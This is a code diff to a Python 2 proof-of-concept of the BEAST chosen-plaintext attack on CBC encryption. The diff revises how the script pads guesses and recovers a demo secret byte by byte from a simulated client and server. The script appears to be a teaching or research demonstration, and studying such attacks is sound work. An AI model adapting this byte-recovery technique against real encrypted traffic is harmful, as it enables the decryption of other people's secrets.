@@ -54,9 +54,8 @@ class SecureTCPHandler(SocketServer.BaseRequestHandler):
             data = self.request.recv(1024)
             if data == '':
                 break
-            #print "serveur"
-            #print split_len(binascii.hexlify(data), 32)
-            #print ''
+            # de = cbc.decrypt(data)
+            # print [de[i:i+16] for i in range(0, len(de), 16)]
         except ssl.SSLError as e:
             pass
     return
@@ -101,7 +100,7 @@ class Client(AESCipher):
         self.cbc = cbc
         self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
         print draw("Sending request : ", bold=True, fg_yellow=True)
-        print draw("the secret is aGybscdefghicasaa" + "\n\n",  bold=True, fg_yellow=True)
+        print draw("the secret is Gybscdefghicasaa" + "\n\n",  bold=True, fg_yellow=True)
 
     def connection(self):
         # Initialization of the client
@@ -113,7 +112,7 @@ class Client(AESCipher):
 
     def request_send(self, prefix=0, data=0):
         if data == 0:
-            data = prefix*"a" + "the secret is aGybscdefghicasaa"
+            data = prefix*"a" + "the secret is Gybscdefghicasaa"
         try:
             data = self.cbc.encrypt(data)
             self.socket.sendall(data)
@@ -217,16 +216,16 @@ class BEAST(Client, AESCipher):
         secret = []
 
         #client send + alter
-        test = "the secret is a"
-        add_byte = 16
+        test = "the secret is "
+        padding = self.length_block - len(test) - 1
+        test = "a"*padding + test
+        add_byte = self.length_block
         t = 0
-        tile = len("the secret is aGybscdefghicasaa") - len("the secret is a")
-        while(t < tile):
+        while(t < 16):
             for i in range(1,256):
-
                 self.start_exploit = True
                 self.client_connection()
-                self.request_send(add_byte)
+                self.request_send(add_byte+padding)
                 time.sleep(0.05)           
                 #print "frame1"
                 #print split_len(binascii.hexlify(self.frame), 32)
@@ -234,10 +233,9 @@ class BEAST(Client, AESCipher):
 
                 self.start_exploit = False
                 p_guess = test + chr(i)
-                #print p_guess
                 xored = self.xor_block(p_guess, i)
 
-                self.request_send(add_byte, xored)
+                self.request_send(add_byte+padding, xored)
                 time.sleep(0.05)
                 #print "frame2"
                 #print split_len(binascii.hexlify(self.frame), 32)
